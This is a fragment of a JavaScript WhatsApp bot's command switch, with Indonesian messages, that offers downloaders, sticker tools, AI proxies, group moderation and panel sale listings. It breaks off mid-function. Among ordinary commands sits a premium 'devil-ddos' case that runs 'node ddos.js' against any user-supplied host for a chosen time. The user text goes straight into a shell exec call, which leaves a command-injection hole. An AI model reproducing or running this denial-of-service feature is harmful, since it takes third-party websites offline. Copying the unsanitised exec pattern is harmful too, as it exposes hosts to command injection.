try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
anggazyy.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return reply(e.toString())
}
}
break
case "ytplay": case "play": {
if (!text) return reply(example('Dj tiktok'))
reply(msg.wait)
const { pipeline } = require('stream')
const { promisify } = require('util')
const streamPipeline = promisify(pipeline)
try {
let search = await yts(text)
let vid = search.videos[0]
let { title, thumbnail: thumb, timestamp, author, url } = vid
const audioStream = ytdl(url, {
filter: 'audioonly',
quality: 'highestaudio'})
let acak = await getRandom(".mp3")
let temp = "./all/tmp/" + acak
const writableStream = fs.createWriteStream(temp)
await streamPipeline(audioStream, writableStream)
await anggazyy.sendMessage(m.chat, {audio: fs.readFileSync(temp), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {thumbnailUrl: thumb, title: title, body: "Duration : "+timestamp+" | "+"Author : "+author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(temp)
} catch (e) {
return reply(e.toString())
}
}
break 
case "qc": {
if (!text) return reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./all/tmp/"+makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return reply("Error")
await anggazyy.sendStimg(m.chat, tempnya, m, {packname: namabot})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break
case "list_vps": {
let teks = `
Belum Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "list_domain": {
let teks = `
Belum Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "list_nokos": {
let teks = `
Belum Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
break
case "list_panel": {
const teks = `*private Panel price list⚡*

*📦 Ram 1GB Cpu 40%*
_price : 1500_

*📦 Ram 2GB Cpu 50%*
_price : 2500_

*📦 Ram 3GB Cpu 60%*
_price : 3500_

*📦 Ram 4GB Cpu 80%*
_price : 4000_

*📦 Ram 5GB Cpu 110*
_price : 4500_

*📦 Ram 6GB Cpu 120%* 
_price : 5500_

*📦 Ram 7GB Cpu 130%* 
_price : 6000_

*📦 Ram 8GB Cpu 150%* 
_price : 6800_

*📦 Ram & Cpu Unlimited* 
_price : 9000_

*panel rate:*
* Server *(High Quality)* 🪲
* Bot Auto Fast Respone ⚡
* 10 Day Active Warranty 🥶
* Warranty Claims Must Bring Proof of Transaction!
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"chat with seller 😙\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "script": case "sc": {
let teks = `
Script *Naruto 2.0* This script is for sale dm me EDNUT The creator just 15000 naira click on owner script bot get a free panel too`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"owner Script Bot\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "remini": case "tohd": case "hd": {
if (/image/g.test(mime)) {
reply(msg.wait)
let tingkat
if (/remini/gi.test(command)) tingkat = 4
if (/tohd|hd/gi.test(command)) tingkat = 2
await anggazyy.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
let urlnya = await telegraPh(res)
let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
if (!image.status) return reply("Error!")
await anggazyy.sendMessage(m.chat, {image: {url: image.url}, caption: "Berhasil ✅"}, {quoted: m})
await fs.unlinkSync(res)
}).catch(err => reply(err.toString()))
} else return reply(example('dengan mengirim foto'))
}
break
case "chatgpt": case "gpt": {
if (!text) return reply(example("apa itu nodejs"))
reply(msg.wait)
await fetchJson(`https://aemt.me/gpt4?text=${text}`).then((e) => {
if (!e.status) return reply(JSON.stringify(e, null, 2))
var teks = `*© GPT - Chat Version 0.4*\n\n${e.result}`
reply(teks)
})
}
break
case "ai": case "openai": {
if (!text) return reply(example("kamu siapa"))
reply(msg.wait)
await fetchJson(`https://aemt.me/openai?text=${text}`).then((e) => {
if (!e.status) return reply(JSON.stringify(e, null, 2))
var teks = `*© AI - Asistent v4.0.0*\n\n${e.result}`
reply(teks)
})
}
break
case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return reply("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
anggazyy.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return reply(example("dengan mengirim/balas vidio"))
}
}
break
case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return reply(example('dengan reply sticker'))
reply(msg.wait)
let media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
anggazyy.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {
if (!/video|audio/.test(mime) && !/audio/.test(mime)) return reply(example('dengan mengirim audio/vidio'))
reply(msg.wait)
await anggazyy.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
anggazyy.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return reply("Durasi vidio maksimal 30 detik")
reply(msg.wait)
await anggazyy.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
anggazyy.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
reply(msg.wait)
var media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
await anggazyy.sendStimg(m.chat, media, m, {packname: global.packname})
await fs.unlinkSync(media)
}
break
case "tourl": {
if (!/image/.test(mime)) return reply(example("dengan mengirim foto"))
await reply(msg.wait)
var fotonya = await anggazyy.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
await reply(`Link Tautan :\n${urlimage}`)
await fs.unlinkSync(fotonya)
}
break
case "public": {
if (!isOwner) return reply(msg.owner)
anggazyy.public = true
reply("*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Public*")
}
break
case "self": {
if (!isOwner) return reply(msg.owner)
anggazyy.public = false
reply("*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Self*")
}
break
case "get": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply("linknya")
try {
var check = await fetchJson(text)
reply(JSON.stringify(check, null, 2))
} catch (e) {
return reply(e.toString())
}}
break
case "setteksjpm": {
if (!isOwner) return reply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./list/teksjpm.js", newteks.toString())
reply("*Teks JPM Berhasil Diganti ✅*")
} else {
return reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {
if (!isOwner) return reply(msg.owner)
reply(fs.readFileSync("./list/teksjpm.js").toString())
}
break
case "instagram": case "igdl": case "ig": {
if (!text) return reply(example("linknya"))
if (!text.includes("instagram.com")) return reply("Link tautan tidak valid!")
reply(msg.wait)
await api.igdl(`${text}`).then((res) => {
for (let a of res.result) {
anggazyy.sendMedia(m.chat, a.url, m, {
caption: "*Instagram Downloader ✅*"})
}
}).catch(e => reply(e.toString()))
}
break
case "tiktokaudio": case "tiktokmp3": case "ttaudio": case "ttmp3": {
if (!text) return reply(example("linknya"))
if (!text.includes("tiktok.com")) return reply("Link tautan tidak valid!")
reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
anggazyy.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => reply(e.toString()))
}
break
case "tiktokslide": case "ttslide": {
if (!text) return reply(example("linknya"))
if (!text.includes("tiktok.com")) return reply("Link tautan tidak valid!")
reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`).then(async (data) => {
if (!data.status) return reply(JSON.stringify(data, null, 2))
if (data.result.totalSlide == 0) return reply("Link Tiktok Bukan Slide!")
var cap = `*Tiktok Downloader ✅*`
for (let i of data.result.images) {
anggazyy.sendMessage(m.chat, {image: {url: `${i}`}, caption: cap}, {quoted: m})
}
}).catch(e => reply(e.toString()))
}
break
case "mediafire": {
if (!text) return reply(example("linknya"))
if (!text.includes('mediafire.com')) return reply("Link Tautan Tidak Valid!")
reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return reply("Gagal mendownload, ukuran file terlalu besar")
if (res.filesize.split("MB")[0] >= 100) return reply("Gagal mendownload, ukuran file terlalu besar")
if (res.url == "") return reply(msg.error)
anggazyy.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "*Mediafire Downloader ✅*"}, {quoted: m})
}).catch((e) => reply(e.toString()))
}
break
case "pinterest": case "pin": {
if (!text) return reply(example("tobrut"))
reply(global.msg.wait)
let res = await pinterest(text)
if (res.length == 0) return reply("Error, Foto Tidak Ditemukan")
if (res.length < 5) {
anuan = res
} else {
anuan = res.slice(0,5)
}
let anu = new Array()
for (let ii of anuan) {
let imgsc = await prepareWAMessageMedia({ image: await fetch(`${ii}`)}, { upload: anggazyy.waUploadToServer })
anu.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {                  
                   name: "cta_url",
                   buttonParamsJson:  `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${ii}\",\"merchant_url\":\"https://www.google.com\"}`
                  }
                ]
              })
            })
}

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "🔎 Berikut Adalah Hasil Pencarian Foto Dari *Pinterest*"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: anu
        })
      })
    }
  }
}, {userJid: m.sender, quoted: m})
 
await anggazyy.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "getcase": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./anggazyy.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* Tidak Ditemukan`)
}
}
break

case "tiktok": case "tt": {
if (!text) return reply(example('linknya'))
if (!/tiktok.com/.test(text)) return reply("Link Tautan Tidak Valid!")
reply(msg.wait)
 let anuan = text
await api.tiktok(anuan).then(async (res) => {
var cap = `*Tiktok Downloader ✅*`
if (res.result.duration == 0) {
for (let a of res.result.images) {
anggazyy.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await anggazyy.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => reply(`${e}`))
}
break
case "facebook": case "fb": case "fbdl": {
if (!text) return reply(example("linkvidionya"))
if (!/facebook.com/.test(text)) return reply("Link Tautan Tidak Valid!")
reply(msg.wait)
await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return reply(JSON.stringify(res, null, 2))
anggazyy.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Facebook Downloader ✅*`}, {quoted: m})
}).catch(e => reply(e.toString()))
}
break
case "owner": {
if (!isOwner) return reply('*Oops! no owner*')
anggazyy.sendContact(m.chat, [owner], "Telfon/VC = Ednut", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/anggazyy.jpg"), 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break
case "antilink": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!args[0]) return reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return reply("*Antilink Grup* Di Grup Ini Sudah Aktif!")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
reply("*Berhasil Menyalakan Antilink Grup ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return reply("*Antilink Grup* Di Grup Ini Belum Aktif!")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
reply("*Berhasil Mematikan Antilink Grup ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.owner)
if (!args[0]) return reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return reply("*Antilink Grup V2* Di Grup Ini Sudah Aktif!")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
reply("*Berhasil Menyalakan Antilink Grup V2 ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return reply("*Antilink Grup V2* Di Grup Ini Belum Aktif!")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
reply("*Berhasil Mematikan Antilink Grup V2 ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return reply(example("on/off"))
}}
break
case "welcome": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return reply("*Welcome* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
welcome = true
reply("*Berhasil Menyalakan Welcome ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return reply("*Welcome* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
welcome = false
reply("*Berhasil Mematikan Welcome ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
}}
break
case "autoread": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return reply("*Autoread* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = true
reply("*Berhasil Menyalakan Autoread ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = false
reply("*Berhasil Mematikan Autoread ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoreadsw": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (autoreadsw) return reply("*Autoreadsw* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoreadsw = true
reply("*Berhasil Menyalakan Autoreadsw ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoreadsw) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoreadsw = false
reply("*Berhasil Mematikan Autoreadsw ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
 case 'devil-ddos': case 'dksjsjs':{
            if (!isPremium) return reply(msg.anggazyyprem)
                if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
             reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         }
                break      
case "anticall": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return reply("*Anticall* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = true
reply("*Berhasil Menyalakan Anticall ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return reply("*Anticall* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = false
reply("*Berhasil Mematikan Anticall ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {
if (!isOwner) return reply(msg.owner)
var teks = `
*List Status Setting Bot :*

* Autoread : ${global.autoread ? "*Aktif*" : "*Tidak Aktif*"}
* Autoreadsw : ${global.autoreadsw ? "*Aktif*" : "*Tidak Aktif*"}
* Anticall : ${global.anticall ? "*Aktif*" : "*Tidak Aktif*"}
* Welcome : ${global.welcome ? "*Aktif*" : "*Tidak Aktif*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
reply(teks)
}
break
case "statusgc": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
var anti1 = "*Aktif*"
var anti2 = "*Aktif*"
if (!antilink2.includes(m.chat)) anti2 = "*Tidak Aktif*"
if (!antilink.includes(m.chat)) anti1 = "*Tidak Aktif*"
var teks = `
*List Status Grup Settings :*

* Antilink : ${anti1}
* AntilinkV2 : ${anti2}

*Contoh Penggunaan :*
Ketik *.antilink* on/off
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "setppgc": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (/image/g.test(mime)) {
let media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
await anggazyy.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
reply("*Berhasil Mengganti Foto Grup ✅*")
} else return reply(example('dengan mengirim foto'))
}
break
case "setnamegc": case "setnamagc": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!text) return reply(example('teksnya'))
const gcname = metadata.subject
await anggazyy.groupUpdateSubject(m.chat, text)
reply(`*Berhasil Mengganti Nama Grup ✅*\n*${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!text) return reply(example('teksnya'))
await anggazyy.groupUpdateDescription(m.chat, text)
reply(`*Berhasil Mengganti Deskripsi Grup ✅*`)
}
break
case "open": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
await anggazyy.groupSettingUpdate(m.chat, 'not_announcement')
reply("*Berhasil Mengganti Setelan Grup ✅*\nMenjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
await anggazyy.groupSettingUpdate(m.chat, 'announcement')
reply("*Berhasil Mengganti Setelan Grup ✅*\nMenjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {
if (isGroup) {
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!m.quoted) return reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return reply("Reply Pesan Yang Ingin Di Hapus")
anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anggazyy.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => reply(err.toString()))
} else return reply(example('62838XXX'))}
break
case "promote": case "promot": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anggazyy.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => reply(err.toString()))
} else return reply(example('6283XXX/@tag'))}
break
case "add": case "addmember": {
if (!isGroup) return reply(msg.group)
if (!args[0]) return reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await anggazyy.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await anggazyy.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
